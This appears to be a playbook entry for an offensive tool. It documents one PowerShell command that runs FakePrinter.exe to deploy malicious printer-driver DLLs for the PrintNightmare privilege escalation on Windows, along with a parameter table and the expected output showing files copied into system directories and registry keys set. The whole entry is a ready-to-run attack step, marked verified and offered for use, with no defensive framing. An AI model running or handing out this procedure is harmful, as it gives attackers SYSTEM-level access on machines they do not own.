---
id: 567294d7-8753-40f0-89c9-693e36233a1b
name: run-fakeprinter-exe-for-printer-nightmare
type: command
executor: powershell
data: FakePrinter.exe 32mimispool.dll 64mimispool.dll EasySystemShell
output: null
created_at: '2023-04-06T03:56:29.867228+00:00'
updated_at: '2023-04-10T20:37:34.442831+00:00'
platforms:
  - Windows
tags:
  - privilege-escalation
  - printer-nightmare
verified: true
validated: true
---

# run-fakeprinter-exe-for-printer-nightmare

## Command

```powershell
FakePrinter.exe 32mimispool.dll 64mimispool.dll EasySystemShell
```

## Description

Executes FakePrinter.exe from the DeployPrinterNightmare repo to deploy malicious printer drivers by copying DLLs, adding the driver and printer, and setting registry keys. This sets up the PrinterNightmare exploit for escalation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| 32mimispool.dll | 32-bit malicious DLL file | Yes |
| 64mimispool.dll | 64-bit malicious DLL file | Yes |
| EasySystemShell | Printer name (payload trigger) | Yes |

## Examples

### Basic Usage

```powershell
FakePrinter.exe 32mimispool.dll 64mimispool.dll EasySystemShell
```

Run from the repo directory.

## Expected Output

[+] Copying C:\Windows\system32\mscms.dll to C:\Windows\system32\6cfbaf26f4c64131896df8a522546e9c.dll
[+] Copying 64mimispool.dll to C:\Windows\system32\spool\drivers\x64\3\6cfbaf26f4c64131896df8a522546e9c.dll
[+] Adding printer driver => Generic / Text Only!
[+] Adding printer => EasySystemShell!
[+] Setting 64-bit Registry key
[+] Setting 32-bit Registry key
[+] Setting '*' Registry key

## Related

- [[procedures/PrinterNightmare-Privilege-Escalation]]
